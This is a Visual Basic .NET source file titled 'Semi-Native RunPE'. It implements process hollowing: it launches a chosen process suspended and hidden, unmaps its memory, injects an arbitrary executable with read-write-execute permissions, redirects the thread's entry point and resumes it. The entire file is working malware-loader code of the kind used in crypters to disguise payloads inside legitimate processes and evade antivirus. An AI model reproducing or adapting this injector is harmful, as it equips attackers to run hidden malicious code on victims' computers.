'Semi-Native RunPE                         
'' Author : Simon-Benyo                 
Imports System.Text
Imports System.Runtime.InteropServices
Imports System.Reflection
Imports System.Threading

Public Class mRunpe
    <DllImport("kernel32")> _
    Private Shared Function CreateProcess(ByVal appName As String, ByVal commandLine As StringBuilder, ByVal procAttr As IntPtr, ByVal thrAttr As IntPtr, <MarshalAs(UnmanagedType.Bool)> ByVal inherit As Boolean, ByVal creation As Integer, _
    ByVal env As IntPtr, ByVal curDir As String, <[In]()> ByRef lpStartupInfo As STARTUPINFO, ByVal pInfo As IntPtr()) As <MarshalAs(UnmanagedType.Bool)> Boolean
    End Function
    <DllImport("kernel32")> _
    Private Shared Function GetThreadContext(ByVal hThr As IntPtr, ByVal ctxt As UInteger()) As <MarshalAs(UnmanagedType.Bool)> Boolean
    End Function
    <DllImport("ntdll")> _
    Private Shared Function NtUnmapViewOfSection(ByVal hProc As IntPtr, ByVal baseAddr As IntPtr) As UInteger
    End Function
    <DllImport("kernel32")> _
    Private Shared Function ReadProcessMemory(ByVal hProc As IntPtr, ByVal baseAddr As IntPtr, ByRef bufr As IntPtr, ByVal bufrSize As Integer, ByRef numRead As IntPtr) As <MarshalAs(UnmanagedType.Bool)> Boolean
    End Function
    <DllImport("kernel32.dll")> _
    Private Shared Function ResumeThread(ByVal hThread As IntPtr) As UInteger
    End Function
    <DllImport("kernel32")> _
    Private Shared Function SetThreadContext(ByVal hThr As IntPtr, ByVal ctxt As UInteger()) As <MarshalAs(UnmanagedType.Bool)> Boolean
    End Function
    <DllImport("kernel32")> _
    Private Shared Function VirtualAllocEx(ByVal hProc As IntPtr, ByVal addr As IntPtr, ByVal sizel As IntPtr, ByVal allocType As Integer, ByVal prot As Integer) As IntPtr
    End Function
    <DllImport("kernel32", CharSet:=CharSet.Auto, SetLastError:=True)> _
    Private Shared Function VirtualProtectEx(ByVal hProcess As IntPtr, ByVal lpAddress As IntPtr, ByVal dwSize As IntPtr, ByVal flNewProtect As UInteger, ByRef lpflOldProtect As UInteger) As Boolean
    End Function
    <DllImport("kernel32.dll", SetLastError:=True)> _
    Private Shared Function WriteProcessMemory(ByVal hProcess As IntPtr, ByVal lpBaseAddress As IntPtr, ByVal lpBuffer As Byte(), ByVal nSize As UInteger, ByVal lpNumberOfBytesWritten As Integer) As Boolean
    End Function

    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> _
    Structure STARTUPINFO
        Public cb As Integer
        Public lpReserved As String
        Public lpDesktop As String
        Public lpTitle As String
        Public dwX As Integer
        Public dwY As Integer
        Public dwXSize As Integer
        Public dwYSize As Integer
        Public dwXCountChars As Integer
        Public dwYCountChars As Integer
        Public dwFillAttribute As Integer
        Public dwFlags As Integer
        Public wShowWindow As Short
        Public cbReserved2 As Short
        Public lpReserved2 As Integer
        Public hStdInput As Integer
        Public hStdOutput As Integer
        Public hStdError As Integer
    End Structure

    Private Const STARTF_USESHOWWINDOW As Long = &H1
    Private Const STARTF_USESTDHANDLES As Long = &H100
    Private Const SW_HIDE As Integer = 0

    Public Shared Function InjectPE(ByVal bytes As Byte(), ByVal surrogateProcess As String, Optional ByVal optionalArguments As String = "") As Boolean
        Try
            Dim procAttr As IntPtr = IntPtr.Zero
            Dim processInfo As IntPtr() = New IntPtr(3) {}
            Dim startupInfo = New STARTUPINFO() 'Byte() = New Byte(67) {}

            Dim num2 As Integer = BitConverter.ToInt32(bytes, 60)
            Dim num As Integer = BitConverter.ToInt16(bytes, num2 + 6)
            Dim ptr4 As New IntPtr(BitConverter.ToInt32(bytes, num2 + &H54))

            startupInfo.cb = Len(startupInfo)
            startupInfo.wShowWindow = SW_HIDE
            startupInfo.dwFlags = STARTF_USESHOWWINDOW Or STARTF_USESTDHANDLES

            Dim myProcess As New Process()
            myProcess.StartInfo.CreateNoWindow = False

            If Not String.IsNullOrEmpty(optionalArguments) Then
                surrogateProcess += " " & optionalArguments
            End If

            If Not CreateProcess(Nothing, New StringBuilder(surrogateProcess), procAttr, procAttr, False, 4, _
            procAttr, Nothing, startupInfo, processInfo) Then
                Return False
            Else
                Dim ctxt As UInteger() = New UInteger(178) {}
                ctxt(0) = &H10002
                If GetThreadContext(processInfo(1), ctxt) Then
                    Dim baseAddr As New IntPtr(ctxt(&H29) + 8L)

                    Dim buffer__1 As IntPtr = IntPtr.Zero
                    Dim bufferSize As New IntPtr(4)

                    Dim numRead As IntPtr = IntPtr.Zero

                    If ReadProcessMemory(processInfo(0), baseAddr, buffer__1, CInt(bufferSize), numRead) AndAlso (NtUnmapViewOfSection(processInfo(0), buffer__1) = 0) Then
                        Dim addr As New IntPtr(BitConverter.ToInt32(bytes, num2 + &H34))
                        Dim sizel As New IntPtr(BitConverter.ToInt32(bytes, num2 + 80))
                        Dim lpBaseAddress As IntPtr = VirtualAllocEx(processInfo(0), addr, sizel, &H3000, &H40)

                        Dim lpNumberOfBytesWritten As Integer

                        WriteProcessMemory(processInfo(0), lpBaseAddress, bytes, CUInt(CInt(ptr4)), lpNumberOfBytesWritten)
                        Dim num5 As Integer = num - 1
                        For i As Integer = 0 To num5
                            Dim dst As Integer() = New Integer(9) {}
                            Buffer.BlockCopy(bytes, (num2 + &HF8) + (i * 40), dst, 0, 40)
                            Dim buffer2 As Byte() = New Byte((dst(4) - 1)) {}
                            Buffer.BlockCopy(bytes, dst(5), buffer2, 0, buffer2.Length)

                            sizel = New IntPtr(lpBaseAddress.ToInt32() + dst(3))
                            addr = New IntPtr(buffer2.Length)

                            WriteProcessMemory(processInfo(0), sizel, buffer2, CUInt(addr), lpNumberOfBytesWritten)
                        Next
                        sizel = New IntPtr(ctxt(&H29) + 8L)
                        addr = New IntPtr(4)

                        WriteProcessMemory(processInfo(0), sizel, BitConverter.GetBytes(lpBaseAddress.ToInt32()), CUInt(addr), lpNumberOfBytesWritten)
                        ctxt(&H2C) = CUInt(lpBaseAddress.ToInt32() + BitConverter.ToInt32(bytes, num2 + 40))
                        SetThreadContext(processInfo(1), ctxt)
                    End If
                End If
                Threading.Thread.Sleep(1000)
                ResumeThread(processInfo(1))
            End If
        Catch ex As Exception
            Return False
        End Try
        Return True
    End Function
End Class
